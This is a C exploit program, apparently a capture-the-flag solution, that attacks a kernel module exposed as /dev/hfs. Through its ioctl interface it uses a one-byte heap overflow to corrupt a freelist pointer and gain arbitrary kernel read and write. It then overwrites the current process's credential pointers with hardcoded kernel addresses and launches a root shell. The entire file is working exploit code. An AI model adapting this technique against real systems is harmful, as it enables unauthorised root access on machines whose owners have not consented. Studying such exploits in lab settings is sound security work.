#include <unistd.h>
#include <string.h>
#include <stropts.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/shm.h>

/* constants for the different commands */
#define ALLOCATE 0xABCD0001
#define DESTROY 0xABCD0002
#define READ 0xABCD0003
#define WRITE 0xABCD0004

/* struct for command parameters.
 * some commands do not use all the fields (for example, ALLOCATE only uses id and size)
*/
typedef struct {
  long id;
  long size;
  char* buf;
} req;

/* file descriptor to the opened device (global variable for convenience) */
int hfs = -1;

/* open the device (must be called at start) */
void open_hfs() {
  hfs = open("/dev/hfs", O_RDWR);
  if (hfs < 0) {
    perror("[-] open hfs failed");
    exit(1);
  }
  printf("[+] open fd: %x\n", hfs);
}


void make_call(long action, long id, long size, void* buf) {
  req r = {.id = id, .size = size, .buf = buf };
  if (ioctl(hfs, action, &r) != 0) {
    perror("[-] ioctl failed");
    printf("ioctl args: %lx %lx %lx %p\n", action, id, size, buf);
    exit(1);
  }
}

/* print the data of a channel as nicely formated hex */
void dump(long id, long size) {
  char* buf = malloc(size);
  make_call(READ, id, size, buf);
  printf("%lx: ", id);
  for (long i = 0; i < size; ++i) {
    printf("%02hhx ", buf[i]);
  }
  printf("\n");
                                  
  free(buf);
}

/* kernel module representation of a channel */
typedef struct {
  long id;
  char* buf;
  long size;
  long padding;
} channel;

int main(int argc, char** argv) {
  open_hfs();

  // alloc some
  for (int i = 0; i < 0x85; ++i) {
      make_call(ALLOCATE, 0xf000 + i, 0x20, 0);
  }
  puts("[+] alloc done");

  // overwrite the next_free pointer of a freed chunk (0xf080 in this case)
  make_call(DESTROY, 0xf080, 0, 0);
  char overflow_data[0x21];
  memset(overflow_data, 'o', 0x21);
  // this offset was determined experimentally (play around in 0x20 increments)
  overflow_data[0x20] = 0xc0;
  make_call(WRITE, 0xf07f, 0x21, overflow_data);
  make_call(ALLOCATE, 0xf080, 0x20, 0);
  puts("[+] corruption done");
  fflush(stdout);

  // i don't 100% understand why this works but now f080->data points to f080 channel struct which is really nice
  // but it is confusing if it points to itself, make it point to some other channel struct
  channel leak;
  make_call(READ, 0xf080, 0x20, &leak);
  printf("[+] got leak: %p\n", leak.buf);
  leak.buf += 0x40;
  leak.id = 0x0; // set the id to zero, so that the freelist is correct again (0 is a valid next_ptr)
  make_call(WRITE, 0xf080, 0x20, &leak);

  // now, f080 points at the channel struct of f081
  // arbitrary WRITE!
  dump(0x0, 0x20);

  // overwrite current tasks' real_cred and cred with initial task credentials
  leak.buf = (char*)0xffffffff81a3a040; // pointer to task struct
  leak.size = 8;
  leak.id = 0xf081;
  char* task_struct;
  make_call(WRITE, 0x0, 0x20, &leak);
  make_call(READ, 0xf081, 0x8, &task_struct);
  printf("task_struct location: %p\n", task_struct);

  char* new_cred = (char*)0xffffffff81a3f1c0;

  char* real_cred;
  leak.buf = task_struct + 0x3b8;
  make_call(WRITE, 0x0, 0x20, &leak);
  make_call(READ, 0xf081, 0x8, &real_cred);
  make_call(WRITE, 0xf081, 0x8, &new_cred);

  char* cred;
  leak.buf = task_struct + 0x3c0;
  make_call(WRITE, 0x0, 0x20, &leak);
  make_call(READ, 0xf081, 0x8, &cred);
  make_call(WRITE, 0xf081, 0x8, &new_cred);

  printf("old real_cred %p cred %p\n", real_cred, cred);

  puts("[+] creds patched. should be root now");
  execl("/bin/sh", "/bin/sh", NULL);

  puts("[+] done");
}
